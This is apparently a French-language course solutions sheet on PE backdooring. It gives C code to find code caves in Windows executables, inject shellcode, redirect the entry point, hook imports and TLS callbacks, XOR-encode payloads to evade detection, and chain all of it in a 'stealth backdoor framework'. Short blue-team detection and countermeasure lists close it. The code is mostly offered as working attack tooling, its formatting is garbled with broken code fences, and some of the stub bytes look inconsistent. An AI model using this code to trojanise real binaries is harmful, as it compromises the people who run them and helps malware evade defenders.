SOLUTIONS - Module 39 : Code Caves & PE Backdooring

AVERTISSEMENT : Solutions educatives uniquement. Implementation complete malware interdite.

Solution 1 : PE Header Parser

Parsing complet structure PE avec toutes validations necessaires.

```c

```c
void parse_pe_headers(const char* filename) {
```
    size_t filesize;
    unsigned char* data = read_file(filename, &filesize);

    IMAGE_DOS_HEADER* dos = (IMAGE_DOS_HEADER*)data;
    printf("DOS Signature: 0x%X\n", dos->e_magic);
    printf("PE Header Offset: 0x%X\n", dos->e_lfanew);

    IMAGE_NT_HEADERS* nt = (IMAGE_NT_HEADERS*)(data + dos->e_lfanew);
    printf("Machine: 0x%X\n", nt->FileHeader.Machine);
    printf("Sections: %d\n", nt->FileHeader.NumberOfSections);
    printf("Entry Point RVA: 0x%X\n", nt->OptionalHeader.AddressOfEntryPoint);
    printf("Image Base: 0x%llX\n", nt->OptionalHeader.ImageBase);

    free(data);
}
```

Solution 2 : Code Cave Detector Avance

Detection avec filtrage permissions et calcul entropie.

```c
double calculate_entropy(unsigned char* data, size_t len) {
    int freq[256] = {0};
    for (size_t i = 0; i < len; i++) freq[data[i]]++;

    double entropy = 0.0;
    for (int i = 0; i < 256; i++) {
        if (freq[i] > 0) {
            double p = (double)freq[i] / len;
            entropy -= p * log2(p);
        }
    }
    return entropy;
}


```c
void find_executable_caves(unsigned char* data, IMAGE_SECTION_HEADER* section) {
```
    if (!(section->Characteristics & 0x20000000)) return; // Not executable


```c
    // Recherche caves avec entropie < 1.0 (suspectes si trop basse)
```
    double entropy = calculate_entropy(data + section->PointerToRawData,
                                      section->SizeOfRawData);
    printf("Section %.8s entropy: %.2f\n", section->Name, entropy);
}
```

Solution 3 : Shellcode Injector

Injection shellcode avec verification taille et backup.

```c
int inject_shellcode(const char* filename, uint32_t cave_offset,
                     unsigned char* shellcode, size_t shellcode_len) {

```c
    // Backup original
    char backup[256];
```
    snprintf(backup, sizeof(backup), "%s.bak", filename);
    FILE* src = fopen(filename, "rb");
    FILE* dst = fopen(backup, "wb");
    unsigned char buf[4096];
    size_t n;
    while ((n = fread(buf, 1, sizeof(buf), src)) > 0) {
        fwrite(buf, 1, n, dst);
    }
    fclose(src);
    fclose(dst);


```c
    // Injection
```
    FILE* f = fopen(filename, "r+b");
    fseek(f, cave_offset, SEEK_SET);
    fwrite(shellcode, 1, shellcode_len, f);
    fclose(f);

    printf("[+] Shellcode injected at offset 0x%X\n", cave_offset);
    return 0;
}
```

Solution 4 : Entry Point Redirection

Modification entry point avec preservation OEP.

```c
int redirect_entry_point(const char* filename, uint32_t cave_rva) {
    size_t filesize;
    unsigned char* data = read_file(filename, &filesize);

    IMAGE_DOS_HEADER* dos = (IMAGE_DOS_HEADER*)data;
    IMAGE_NT_HEADERS* nt = (IMAGE_NT_HEADERS*)(data + dos->e_lfanew);

    uint32_t original_ep = nt->OptionalHeader.AddressOfEntryPoint;
    printf("[*] Original Entry Point: 0x%X\n", original_ep);


```c
    // Stub: PUSH original_EP, JMP cave
```
    unsigned char stub[] = {
        0x68, 0x00, 0x00, 0x00, 0x00,  // PUSH original_EP
        0xE9, 0x00, 0x00, 0x00, 0x00   // JMP cave_rva
    };
    *(uint32_t*)(stub + 1) = original_ep;
    *(uint32_t*)(stub + 6) = cave_rva - (original_ep + 10);


```c
    // Modifier entry point
```
    nt->OptionalHeader.AddressOfEntryPoint = cave_rva;


```c
    // Sauvegarder
```
    FILE* f = fopen(filename, "wb");
    fwrite(data, 1, filesize, f);
    fclose(f);
    free(data);

    return 0;
}
```

Solution 5 : Import Address Table Hooking

Hook IAT pour intercepter appels fonctions.

```c
uint32_t find_iat_entry(unsigned char* data, const char* function_name) {
    IMAGE_DOS_HEADER* dos = (IMAGE_DOS_HEADER*)data;
    IMAGE_NT_HEADERS* nt = (IMAGE_NT_HEADERS*)(data + dos->e_lfanew);

    uint32_t import_rva = nt->OptionalHeader.DataDirectory[1].VirtualAddress;
    IMAGE_IMPORT_DESCRIPTOR* import_desc =
        (IMAGE_IMPORT_DESCRIPTOR*)(data + rva_to_offset(data, import_rva));

    while (import_desc->Name) {
        IMAGE_THUNK_DATA* thunk =
            (IMAGE_THUNK_DATA*)(data + rva_to_offset(data, import_desc->FirstThunk));

        while (thunk->u1.AddressOfData) {
            IMAGE_IMPORT_BY_NAME* import_name =
                (IMAGE_IMPORT_BY_NAME*)(data + rva_to_offset(data, thunk->u1.AddressOfData));

            if (strcmp(import_name->Name, function_name) == 0) {
                return (uint32_t)((unsigned char*)thunk - data);
            }
            thunk++;
        }
        import_desc++;
    }
    return 0;
}
```

Solution 6 : TLS Callback Injection

Ajout callback TLS pour execution pre-entry point.

```c
int add_tls_callback(const char* filename, uint32_t callback_rva) {
    size_t filesize;
    unsigned char* data = read_file(filename, &filesize);

    IMAGE_DOS_HEADER* dos = (IMAGE_DOS_HEADER*)data;
    IMAGE_NT_HEADERS* nt = (IMAGE_NT_HEADERS*)(data + dos->e_lfanew);


```c
    // Localiser TLS directory
```
    uint32_t tls_rva = nt->OptionalHeader.DataDirectory[9].VirtualAddress;
    if (tls_rva == 0) {
        printf("[!] No TLS directory - need to create one\n");

```c
        // Creation TLS directory omise (complexe)
```
        free(data);
        return -1;
    }

    IMAGE_TLS_DIRECTORY* tls =
        (IMAGE_TLS_DIRECTORY*)(data + rva_to_offset(data, tls_rva));


```c
    // Ajouter callback a la liste
```
    printf("[+] TLS callbacks array at RVA: 0x%X\n", tls->AddressOfCallBacks);

    free(data);
    return 0;
}
```

Solution 7 : Polymorphic Code Cave

Shellcode polymorphique avec encoder XOR.

```c

```c
void generate_polymorphic_payload(unsigned char* shellcode, size_t len,
```
                                  unsigned char* output, size_t* output_len) {
    unsigned char key = rand() % 256;


```c
    // Decoder stub
```
    unsigned char stub[] = {
        0xEB, 0x10,                    // JMP +16 (over encoded data)

```c
        // ... encoded shellcode here ...
```
        0x31, 0xC9,                    // XOR ECX, ECX
        0xB1, (unsigned char)len,      // MOV CL, len
        0x8D, 0x3D, 0xF0, 0xFF, 0xFF, 0xFF,  // LEA EDI, [RIP-16]
        0x80, 0x37, key,               // XOR BYTE [EDI], key
        0x47,                          // INC EDI
        0xE2, 0xFA                     // LOOP -6
    };

    memcpy(output, stub, sizeof(stub));


```c
    // Encoder shellcode
```
    for (size_t i = 0; i < len; i++) {
        output[2 + i] = shellcode[i] ^ key;
    }

    *output_len = sizeof(stub) + len;
    printf("[+] Polymorphic payload generated (key: 0x%02X)\n", key);
}
```

Solution 8 : Stealth Backdoor Framework

Integration complete techniques furtivite.

```c

```c
typedef struct {
```
    uint32_t cave_offset;
    uint32_t cave_rva;
    uint32_t original_ep;
    uint32_t hooked_imports[10];
    int num_hooks;
} BackdoorMetadata;

int create_stealth_backdoor(const char* filename, unsigned char* payload, size_t len) {
    BackdoorMetadata meta = {0};


```c
    // 1. Trouver code cave optimale
```
    CodeCave caves[256];
    int count = find_all_caves(filename, caves, 256, len + 50);
    if (count == 0) return -1;

    meta.cave_offset = caves[0].offset;
    meta.cave_rva = caves[0].rva;


```c
    // 2. Injecter payload polymorphique
```
    unsigned char poly_payload[1024];
    size_t poly_len;
    generate_polymorphic_payload(payload, len, poly_payload, &poly_len);
    inject_shellcode(filename, meta.cave_offset, poly_payload, poly_len);


```c
    // 3. Rediriger entry point
```
    redirect_entry_point(filename, meta.cave_rva);


```c
    // 4. Mettre a jour checksum PE
```
    update_pe_checksum(filename);


```c
    // 5. Sauvegarder metadata pour removal
```
    FILE* f = fopen("backdoor_meta.bin", "wb");
    fwrite(&meta, sizeof(meta), 1, f);
    fclose(f);

    printf("[+] Stealth backdoor installed successfully\n");
    return 0;
}
```

POINTS CLES

- Toujours backup fichiers avant modification
- Valider structure PE apres chaque modification
- Tester execution pour eviter crashes
- Utiliser debugger pour verifier flow execution
- Documenter tous changements pour reversibilite

DETECTION PAR BLUE TEAM

1. Hash verification (fichiers systeme modifies)
2. Entropy analysis (caves avec entropie anormale)
3. Code signing invalidation alerts
4. Behavioral analysis (IAT hooks, TLS callbacks suspects)
5. Memory scanning (code executable regions inattendues)

CONTRE-MESURES

- Application whitelisting (AppLocker, WDAC)
- Integrity monitoring (SIEM, tripwire)
- EDR detection binary modification
- Regular PE integrity audits
- Code signing enforcement strict

